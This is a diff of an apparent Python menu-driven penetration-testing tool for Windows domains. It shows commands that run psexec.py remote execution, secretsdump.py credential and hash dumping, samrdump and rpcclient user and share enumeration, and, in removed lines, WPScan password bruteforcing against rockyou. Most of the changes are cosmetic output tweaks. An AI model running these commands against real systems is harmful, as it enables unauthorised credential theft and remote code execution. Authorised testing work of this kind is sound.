@@ -263,14 +263,14 @@ def display():
 def options():
    print('\u2551' + "(0) REMOTE IP SCANNER  (10) Re/Set WINCOMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) GenUSERList (70)          (80) FTP     " + '\u2551')
    print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) GenPASSList (71)          (81) SSH     " + '\u2551')
-   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY  (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BloodHound   (62) USER Editor (72)          (82) Sqsh    " + '\u2551')
+   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY  (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BloodHound   (62) USER Editor (72)          (82) SQSH    " + '\u2551')
    print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection  (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) ACLPwn       (63) PASS Editor (73)          (83) MySQL   " + '\u2551')
    print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) Secrets Dump (64) PASpray SMB (74)          (84) Telnet  " + '\u2551')
-   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) WPScan      (75)          (85) Netcat  " + '\u2551')
-   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap Slow & Full  (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) PSExec HASH  (66) Dirb        (76)          (86) WinRM   " + '\u2551')
+   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65)             (75)          (85) Netcat  " + '\u2551')
+   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap Slow & Full  (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) PSExec HASH  (66)             (76)          (86) WinRM   " + '\u2551')
    print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Intense TCP  (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)             (77)          (87) RDesktop" + '\u2551')
    print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Sub-Domains  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68)             (78)          (88) XFreerdp" + '\u2551')
-   print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Server Time  (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) GPP Decrypt  (69)             (79)          (89) Quit !! " + '\u2551')
+   print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Server Time  (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) GPP Decrypt  (69)             (79)          (89) Quit!!  " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
 # -------------------------------------------------------------------------------------
@@ -431,7 +431,7 @@ while True:
                   
                if DOM[:5] != "Error":
                   print("[+] Found domain...\n")
-                  command("echo " + DOM)
+                  print(colored(DOM,colour2, attrs=['bold']))
             
                if (DOMC == 1) and (DOM[:5] != "Error"):
                   print("\n[*] Resetting current domain association...")
@@ -461,7 +461,7 @@ while True:
             
                if SID[:5] != "Error":
                   print("[+] Found SID...\n")
-                  command("echo " + SID)
+                  print(colored(SID,colour2, attrs=['bold']))
           
          print("\n[*] Attempting to enumerate shares...")
          command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares1.tmp")
@@ -486,13 +486,10 @@ while True:
                      null, SHAR[x] = SHAR[x].split(":")
                   except ValueError:
                      SHAR[x] = "Error..."
-                  command("echo " + SHAR[x].rstrip("\n"))
+                  print(colored(SHAR[x].rstrip("\n"),colour2, attrs=['bold']))
                   if len(SHAR[x]) < COL2: SHAR[x] = dpadding(SHAR[x], COL2)            
      
-         print("\n[*] Attempting to enumerate domain users...")    
-         command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm='" + DOM.rstrip(" ") + "' " + TIP.rstrip(" "))
-         print("")
-        
+         print("\n[*] Attempting to enumerate domain users...")          
          command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers1.tmp")      
 
          line4 = linecache.getline("domusers1.tmp", 1)
@@ -518,7 +515,7 @@ while True:
                   USER[x] = USER[x].replace("]","")
                   USER[x] = USER[x].replace("rid","")
                   if USER[x][:5] != "Error":
-                     command("echo " + USER[x])
+                     print(colored(USER[x],colour2, attrs=['bold']))
                   if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
                   command("echo " + USER[x] + " >> usernames.txt")
             else:
@@ -1019,32 +1016,15 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
          if USR.rstrip(" ") != "Administrator":
-            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SHARES.tmp")
-            command("cat SHARES.tmp")
-            command("cat SHARES.tmp | wc -l > count.txt")
-            count = int(linecache.getline("count.txt", 1))
-            command("sed -i '1,3d' SHARES.tmp")
-            command("sed -i -e 's/share //g' SHARES.tmp")
-            if count > 0:
-               for x in range(0, MAXX):
-                  SHAR[x] = " "*COL2			# Clean current values.
-            for x in range(0, count):
-               SHAR[x] = linecache.getline("SHARES.tmp",x + 1)
-               SHAR[x] = SHAR[x].replace("[-] ","")
-               SHAR[x] = SHAR[x].replace("'","")
-               SHAR[x] = dpadding(SHAR[x], COL2)
-            os.remove("count.txt")
-            os.remove("SHARES.tmp")
-         else:
             command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
       prompt()
 
@@ -1204,20 +1184,26 @@ while True:
          command("sed -i 's/(SidTypeUser)//g'  USERS.tmp")
          
          if os.path.getsize("ALIAS.tmp") != 0:
-            print("\n[+] Found Aliases...\n")
+            print("[+] Found Aliases...\n")
+            command("tput setaf 2; tput bold")
             command("cat ALIAS.tmp")
+            command("tput sgr0; tput dim")
          else:
             print("[-] Unable to find aliases...")
             
          if os.path.getsize("GROUP.tmp") != 0:
             print("\n[+] Found Groups...\n")
+            command("tput setaf 2; tput bold")
             command("cat GROUP.tmp")
+            command("tput sgr0; tput dim")
          else:
             print("[-] Unable to find groups...")
             
          if os.path.getsize("USERS.tmp") != 0:
             print("\n[+] Found Users...\n")
+            command("tput setaf 2; tput bold")
             command("cat USERS.tmp")  
+            command("tput sgr0; tput dim")
          else:
             print("[-] Unable to find usernames...")
          
@@ -1259,12 +1245,12 @@ while True:
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Enumerating, please wait...")
+         print("\n[*] Enumerating, please wait...\n")
          os.remove("usernames.txt")					# DELETE CURRENT VERSION
-         command("touch usernames.txt")				# CREATE EMPTY NEW ONE
+         command("touch usernames.txt")					# CREATE EMPTY NEW ONE
          command(PATH + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > USERS.tmp")
-         command("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
-         command("sort USERS.tmp > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
+         command("sed -i -n '/Found user: /p' USERS.tmp")		# SELECT ONLY FOUND USERS
+         command("cat USERS.tmp | sort > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
          os.remove("USERS.tmp")
          command("mv USERS2.tmp USERS.tmp")      
 
@@ -1276,21 +1262,19 @@ while True:
                USER[x] = USER[x][0]
                USER[x] = padding(USER[x], COL3)
                if USER[x] != "":
-                  print("[+] Found user " + USER[x])
+                  print(colored(USER[x],colour2, attrs=['bold']))
+
                   command("echo " + USER[x] + " >> usernames.txt")	# ASSIGN USERS NAME
                else:
-                  USER[x] = " "*COL3				# ASSIGN EMPTY USERS
-               PASS[x] = "."*COL4				# RESET PASSWORDS
+                  USER[x] = " "*COL3					# ASSIGN EMPTY USERS
+               PASS[x] = "."*COL4					# RESET PASSWORDS
             else:
                USER[x] = " "*COL3
                PASS[x] = " "*COL4   
    
          os.remove("USERS.tmp")	# CLEAR WORK FILE
          if USER[1][:1] == " ":
-            print ("[-] Errno 104 - Connection reset by peer...")
             print ("[*] No entries received.")
-         else:
-            print("[*] All done!")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1357,7 +1341,10 @@ while True:
 
       if CheckParams != 1:
          command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > SHARES.tmp")
+         
+         command("tput setaf 2; tput bold")
          command("cat SHARES.tmp")
+         command("tput sgr0; tput dim")
          
          command("sed -i /Sharename/d SHARES.tmp")		# TIDY UP THE FILE READY FOR READING
          command("sed -i /-/d         SHARES.tmp")
@@ -1507,7 +1494,10 @@ while True:
 
          os.remove("USERS2.tmp")         
          print("[+] Found Users...\n")
-         command("cat usernames.txt")         
+         
+         command("tput setaf 2; tput bold")
+         command("cat usernames.txt")
+         command("tput sgr0; tput dim")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1961,7 +1951,7 @@ while True:
          CheckParams = 1
 
       if CheckParams != 1:
-         print("Enumerating, please wait...")
+         print("Enumerating, please wait...\n")
          if PAS[:2] != "''":
             command(PATH + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
          else:
@@ -1996,16 +1986,18 @@ while True:
             get3 = get1.rstrip("\n")
             get4 = get4.rstrip("\n")
 
-            print("[+] Found User", get1)
+            print(colored("[+] Found User " + get1,colour2, attrs=['bold']))
             USER[x] = get1[:COL3]
             USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")		# STRIP ANY REMAINING DOMAIN NAME
             PASS[x] = get4[:COL4]         
             
-            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3) 			# USER
+            if len(USER[x]) < COL1: USER[x] = padding(USER[x], COL3) 			# USER
             if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4) 			# PASSWORD
 
          for z in range(0, MAXX):
-            if USER[z].rstrip(" ") == USR.rstrip(" "): NTM = PASS[z]			# RESET DISPLAY HASH
+            if USER[z].rstrip(" ") == USR.rstrip(" "):
+               NTM = PASS[z]			# RESET DISPLAY HASH
+               if len(NTM) < COL1: NTM = padding(NTM, COL1)
 
          os.remove("SECRETS.tmp")
       prompt()
@@ -2302,21 +2294,12 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Active
-# Details : Menu option selected - WPScanner - version 1.
+# Details : Menu option selected - Exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='65':
-     if TIP[:5] != "EMPTY":
-         print("[*] Attempting to enumerate usernames...")
-         command("wpscan --url " + TIP.rstrip(" ") + " --enumerate u -o usernames2.txt")
-         command("cat usernames2.txt")
-         print("[*] Attempting to enumerate passwords...")
-         if os.path.getsize("passwords.txt") == 0:
-            command("wpscan --url " + TIP.rstrip(" ") + " --passwords /usr/share/wordlists/rockyou.txt --usernames usernames2.txt")
-         else:
-            command("wpscan --url " + TIP.rstrip(" ") + " --passwords passwords.txt --usernames usernames2.txt")
-     prompt()
+      exit(1)
             
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2327,10 +2310,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='66':
-      if TIP[:5] != "EMPTY":
-         print("[*] Enumerating, please wait...")
-         command("dirb http://" + TIP.rstrip(" ") + " -R -X .bak,.zip,.php,.html,.pdf,.txt /usr/share/wordlists/dirb/common.txt")
-      prompt()
+      exit(1)
       
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
